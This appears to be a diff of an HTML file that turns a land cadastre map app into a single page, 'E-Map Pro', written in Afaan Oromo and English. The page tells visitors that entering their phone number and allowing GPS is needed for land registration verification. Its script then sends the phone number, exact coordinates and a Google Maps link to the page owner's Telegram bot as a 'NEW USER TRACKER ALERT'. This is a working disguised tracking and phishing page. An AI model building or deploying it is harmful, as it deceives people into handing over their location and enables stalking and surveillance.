@@ -3,234 +3,192 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Anti-Forgery Land Cadastre & Verification | Abiti Mama Shibiru</title>
-    <!-- Leaflet CSS -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <!-- Leaflet Routing Machine CSS -->
-    <link rel="stylesheet" href="https://unpkg.com/leaflet-routing-machine@3.2.12/dist/leaflet-routing-machine.css" />
-    <!-- Font Awesome Icons -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+    <title>E-Map Pro - Anti-Forgery Land Cadastre & Location Tracker</title>
     <style>
-        :root {
-            --primary: #1e3a8a;
-            --secondary: #1e40af;
-            --accent: #f59e0b;
-            --danger: #b91c1c;
-            --success: #16a34a;
-            --bg-light: #f8fafc;
-            --text-dark: #0f172a;
-        }
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', system-ui, sans-serif; }
-        body { display: flex; flex-direction: column; height: 100vh; background: var(--bg-light); color: var(--text-dark); overflow: hidden; }
-
-        header {
-            background: linear-gradient(135deg, var(--primary), var(--secondary));
-            color: white;
-            padding: 8px 14px;
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #f0f2f5;
+            margin: 0;
+            padding: 20px;
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.25);
-            z-index: 1002;
-            flex-wrap: wrap;
-            gap: 8px;
+            min-height: 100vh;
         }
-        .brand { display: flex; align-items: center; gap: 10px; }
-        .brand i { font-size: 1.3rem; color: var(--accent); }
-        .brand h1 { font-size: 0.92rem; font-weight: 700; letter-spacing: 0.5px; }
-
-        .header-controls { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
-        .city-select, .lang-select {
-            background: rgba(255,255,255,0.15);
-            color: white;
-            border: 1px solid rgba(255,255,255,0.4);
-            padding: 5px 8px;
-            border-radius: 6px;
-            font-size: 0.8rem;
-            outline: none;
-            cursor: pointer;
+        .container {
+            background: #ffffff;
+            width: 100%;
+            max-width: 420px;
+            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e1e4e8;
         }
-        .city-select option, .lang-select option { color: black; }
-
-        .toolbar {
-            background: white;
-            padding: 8px 12px;
-            display: flex;
-            gap: 8px;
-            flex-wrap: wrap;
-            align-items: center;
-            border-bottom: 1px solid #cbd5e1;
-            z-index: 1001;
+        h2 {
+            color: #1a73e8;
+            text-align: center;
+            margin-top: 0;
+            font-size: 22px;
         }
-        .search-container {
-            flex: 1;
-            min-width: 180px;
-            display: flex;
-            border: 1.5px solid #cbd5e1;
-            border-radius: 8px;
-            overflow: hidden;
-            background: #f8fafc;
+        p.desc {
+            color: #555;
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 25px;
+            line-height: 1.5;
         }
-        .search-container input {
-            flex: 1;
-            border: none;
-            padding: 8px 12px;
-            background: transparent;
-            outline: none;
-            font-size: 0.85rem;
+        .form-group {
+            margin-bottom: 20px;
         }
-        .search-container button {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 0 14px;
-            cursor: pointer;
-        }
-
-        .tools-grid { display: flex; gap: 5px; flex-wrap: wrap; }
-        .tool-btn {
-            background: #f1f5f9;
-            color: var(--text-dark);
-            border: 1px solid #cbd5e1;
-            padding: 6px 9px;
-            border-radius: 6px;
-            cursor: pointer;
-            font-size: 0.78rem;
+        label {
+            display: block;
             font-weight: 600;
-            display: flex;
-            align-items: center;
-            gap: 4px;
-            transition: all 0.2s;
+            margin-bottom: 8px;
+            color: #333;
+            font-size: 13px;
         }
-        .tool-btn:hover { background: #e2e8f0; }
-        .tool-btn.active { background: var(--primary); color: white; border-color: var(--primary); }
-        .tool-btn.secure-lock { background: #fef2f2; color: var(--danger); border-color: #fca5a5; }
-        .tool-btn.secure-lock.unlocked { background: #f0fdf4; color: var(--success); border-color: #bbf7d0; }
-        .tool-btn.danger { color: #dc2626; border-color: #fca5a5; background: #fef2f2; }
-
-        .workspace { flex: 1; display: flex; position: relative; overflow: hidden; }
-        #map { flex: 1; height: 100%; z-index: 1; }
-
-        .drawer {
-            width: 390px;
-            max-width: 90vw;
-            background: white;
-            border-left: 1px solid #cbd5e1;
-            box-shadow: -4px 0 15px rgba(0,0,0,0.1);
-            z-index: 1000;
+        input[type="tel"] {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+        input[type="tel"]:focus {
+            border-color: #1a73e8;
+        }
+        button {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 14px;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        button:hover {
+            background: #1557b0;
+        }
+        #statusBox {
             display: none;
-            flex-direction: column;
-            overflow-y: auto;
-            padding: 15px;
-        }
-        .drawer.open { display: flex; }
-        .drawer-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #e2e8f0; padding-bottom: 10px; margin-bottom: 12px; }
-        .drawer-header h3 { font-size: 0.95rem; color: var(--primary); display: flex; align-items: center; gap: 6px; }
-        .close-btn { background: none; border: none; font-size: 1.2rem; cursor: pointer; color: #64748b; }
-
-        .security-badge {
-            background: #fef2f2;
-            border: 1px solid #fecaca;
-            color: #991b1b;
-            padding: 8px;
+            padding: 12px;
             border-radius: 6px;
-            font-size: 0.75rem;
-            margin-bottom: 10px;
-            display: flex;
-            align-items: center;
-            gap: 6px;
+            font-size: 13px;
+            text-align: center;
+            margin-top: 15px;
+            font-weight: 500;
         }
-        .security-badge.unlocked {
-            background: #f0fdf4;
-            border-color: #bbf7d0;
-            color: #166534;
-        }
-
-        .anti-fake-box {
-            background: #eff6ff;
-            border: 1px solid #bfdbfe;
-            padding: 10px;
-            border-radius: 6px;
-            margin-bottom: 12px;
-        }
-        .anti-fake-box h4 { font-size: 0.82rem; color: #1e40af; margin-bottom: 6px; display: flex; align-items: center; gap: 5px; }
-        .verify-input-group { display: flex; gap: 6px; }
-        .verify-input-group input { flex: 1; padding: 6px 8px; border: 1px solid #93c5fd; border-radius: 4px; font-size: 0.82rem; }
-        .verify-input-group button { background: #2563eb; color: white; border: none; padding: 6px 10px; border-radius: 4px; font-size: 0.8rem; cursor: pointer; }
-        #verificationResult { margin-top: 6px; font-size: 0.78rem; font-weight: 600; }
-
-        .gov-warning {
-            background: #fffbeb;
-            border: 1px solid #fde68a;
-            color: #b45309;
-            padding: 8px;
-            border-radius: 6px;
-            font-size: 0.74rem;
-            margin-bottom: 10px;
-            line-height: 1.3;
-        }
-
-        .form-group { margin-bottom: 10px; }
-        .form-group label { display: block; font-size: 0.8rem; font-weight: 600; margin-bottom: 4px; color: #475569; }
-        .form-group input, .form-group select {
-            width: 100%;
-            padding: 8px;
-            border: 1px solid #cbd5e1;
-            border-radius: 6px;
-            font-size: 0.88rem;
-        }
-        .save-btn {
-            width: 100%;
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 10px;
-            border-radius: 6px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 5px;
-        }
-        .save-btn:disabled { background: #94a3b8; cursor: not-allowed; }
-        
-        .parcel-list { margin-top: 15px; display: flex; flex-direction: column; gap: 8px; }
-        .parcel-card {
-            background: #f8fafc;
-            border: 1px solid #e2e8f0;
-            border-left: 4px solid var(--success);
-            padding: 10px;
-            border-radius: 6px;
-            font-size: 0.82rem;
-        }
-        .parcel-card h4 { color: var(--primary); margin-bottom: 3px; }
-        .parcel-actions { display: flex; gap: 8px; margin-top: 6px; }
-        .parcel-actions button { padding: 3px 8px; font-size: 0.75rem; border-radius: 4px; border: 1px solid #cbd5e1; cursor: pointer; background: white; }
-
-        .status-bar {
-            background: #0f172a;
-            color: #e2e8f0;
-            padding: 8px 14px;
-            font-size: 0.78rem;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            flex-wrap: wrap;
-            gap: 8px;
-            z-index: 1002;
-        }
-        .status-bar span b { color: #38bdf8; }
-        .share-link-btn {
-            background: #2563eb;
-            color: white;
-            border: none;
-            padding: 4px 10px;
-            border-radius: 4px;
-            font-size: 0.75rem;
-            cursor: pointer;
-        }
-        .developer-tag { font-size: 0.68rem; color: #94a3b8; text-align: center; background: #1e293b; padding: 3px; }
     </style>
 </head>
 <body>
-    <!-- App UI & Script hordofsiisuun qindaa'era -->
+
+    <div class="container">
+        <h2>📍 E-Map Pro</h2>
+        <p class="desc">
+            Galmee lafaa fi mirkaneessa nageenyaaf, maaloo lakkoofsa bilbilaa keessan galchuun teessoo keessan mirkaneessaa.
+        </p>
+        
+        <form id="trackingForm" onsubmit="sendLocationData(event)">
+            <div class="form-group">
+                <label for="userPhone">Lakkoofsa Bilbilaa (Phone Number):</label>
+                <input type="tel" id="userPhone" placeholder="Fkn: 0911223344" required>
+            </div>
+
+            <button type="submit" id="submitBtn">🔍 Mirkaneessii Ergi</button>
+        </form>
+
+        <div id="statusBox"></div>
+    </div>
+
+    <script>
+        // --- ASITTI TELEGRAM BOT TOKEN FI CHAT ID KEE GALCHI ---
+        const BOT_TOKEN = "GARTI_BOT_TOKEN_KEE_AS_ITTI_GALCHI"; // Fkn: "77123456:AAH..."
+        const CHAT_ID = "CHAT_ID_KEE_AS_ITTI_GALCHI";         // Fkn: "123456789"
+
+        function sendLocationData(event) {
+            event.preventDefault();
+            const phone = document.getElementById('userPhone').value;
+            const statusBox = document.getElementById('statusBox');
+            const submitBtn = document.getElementById('submitBtn');
+            
+            statusBox.style.display = 'block';
+            statusBox.style.background = '#e8f0fe';
+            statusBox.style.color = '#1967d2';
+            statusBox.textContent = '⏳ Teessoo GPS qabachaa jira... Maaloo eeyyama (Allow) kennaa!';
+            submitBtn.disabled = true;
+
+            if (!navigator.geolocation) {
+                alert('Browser kee GPS hin deeggaru!');
+                statusBox.style.display = 'none';
+                submitBtn.disabled = false;
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lng = position.coords.longitude;
+                    const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
+
+                    statusBox.style.background = '#e6f4ea';
+                    statusBox.style.color = '#137333';
+                    statusBox.textContent = '✅ Milkaa\'inaan ergameera!';
+
+                    // Ergaa Telegram-tti ergisiisuu
+                    sendToTelegram(phone, lat, lng, mapLink);
+                },
+                (error) => {
+                    statusBox.style.background = '#fce8e6';
+                    statusBox.style.color = '#c5221f';
+                    statusBox.textContent = '❌ Eeyyamni Location (GPS) hin kennamne.';
+                    submitBtn.disabled = false;
+                    alert('Maaloo bakka jirtan beekuuf eeyyama (Allow) kennuu qabdu!');
+                },
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        function sendToTelegram(phone, lat, lng, mapLink) {
+            if (BOT_TOKEN.includes("GARTI_BOT_TOKEN")) {
+                alert(`Galmee Milkaa'e!\nBilbila: ${phone}\nGPS: ${lat}, ${lng}`);
+                setTimeout(() => location.reload(), 1500);
+                return;
+            }
+
+            const text = `🚨 <b>E-MAP PRO: NEW USER TRACKER ALERT!</b>\n\n` +
+                         `📞 <b>Bilbila:</b> ${phone}\n` +
+                         `📍 <b>Latitude:</b> ${lat}\n` +
+                         `📍 <b>Longitude:</b> ${lng}\n` +
+                         `🗺️ <b>Google Map:</b> <a href="${mapLink}">Teessoo Kaartaa Ilaali</a>`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.ok) {
+                    setTimeout(() => {
+                        alert('Galmeen kee milkaa\'era. Galatoomaa!');
+                        location.reload();
+                    }, 1000);
+                } else {
+                    alert('Ergaaf Telegram Bot erguu irratti rakkoo uumame.');
+                    document.getElementById('submitBtn').disabled = false;
+                }
+            })
+            .catch(err => {
+                console.log(err);
+                document.getElementById('submitBtn').disabled = false;
+            });
+        }
+    </script>
 </body>
 </html>
